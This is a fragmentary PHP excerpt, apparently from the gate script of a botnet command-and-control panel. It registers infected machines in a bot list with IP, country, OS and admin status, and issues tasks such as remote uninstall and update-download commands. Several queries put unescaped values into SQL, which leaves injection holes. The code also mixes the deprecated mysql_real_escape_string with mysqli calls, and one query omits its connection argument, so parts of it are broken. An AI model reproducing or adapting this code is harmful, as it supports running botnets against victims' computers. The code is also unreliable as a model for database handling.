<?php
	...
	$INTERVAL = mysqli_fetch_array(mysqli_query($conn, 'SELECT data FROM config WHERE value = \'knock\';'));
	...
	if($TYPE == 'on_exec')
	{
		$EXISTS = (mysqli_num_rows(mysqli_query($conn, 'SELECT id FROM botlist WHERE botid = \'' . $UID . '\' LIMIT 1;')) != 0);
		
		if(!$EXISTS)
		{
			mysqli_query($conn, 'DELETE FROM botlist WHERE ip = \'' . $_SERVER['REMOTE_ADDR'] . '\';');
			
			mysqli_query($conn, 'INSERT INTO botlist SET ' . 
		...
		{
			mysqli_query($conn, 'UPDATE botlist SET ' . 
						'ip=\'' . mysql_real_escape_string($_SERVER['REMOTE_ADDR']) . '\', ' . 
						'newbot=\'' . mysql_real_escape_string($NEW) . '\', ' . 
						'country=\'' . mysql_real_escape_string($country[0]) . '\', ' . 
						'country_code=\'' . mysql_real_escape_string($country[1]) . '\', ' . 
	...
	{					
		$result = mysqli_query($conn, 'SELECT task FROM tasks WHERE id = \'' . mysql_real_escape_string($TASKID) . '\' LIMIT 1;');
		if($result)
		{
			$row = mysqli_fetch_array($result);
			if($row['task'] == '!uninstall' || $row['task'] == '!download.update')
			{
				mysqli_query($conn, 'DELETE FROM botlist WHERE botid = \'' . mysql_real_escape_string($UID) . '\';');
			}
		}
		
		if($RETURN)
		{		
			$result = mysqli_query($conn, 'SELECT parameter FROM tasks WHERE id=\'' . mysql_real_escape_string($TASKID) . '\' LIMIT 1;');
			if(mysqli_num_rows($result) == 1)
			{
				$row = mysqli_fetch_array($result);
				
				mysqli_query($conn, 'INSERT INTO webcheck SET ' . 
							'botid=\'' . mysql_real_escape_string($UID) . '\', ' .
		...
		mysqli_query($conn, 'INSERT INTO tasks_done SET ' . 
						'botid=\'' . mysql_real_escape_string($UID) . '\', ' .
	...
	$BOTINFO = mysqli_fetch_array(mysqli_query($conn, 'SELECT country, os, cpu, type, version, net, admin, busy FROM botlist WHERE botid = \'' . mysql_real_escape_string($UID) . '\' LIMIT 1;'));
	$result = mysqli_query(' SELECT id, task, parameter FROM tasks 
							WHERE
							(
								(
									tasks.id <> 
	...
	{
		$result = mysqli_query($conn, 'SELECT country_name, country_code FROM ip_country WHERE \'' . mysql_real_escape_string($ip2long) . '\' BETWEEN ip_start_long AND ip_end_long LIMIT 1;');
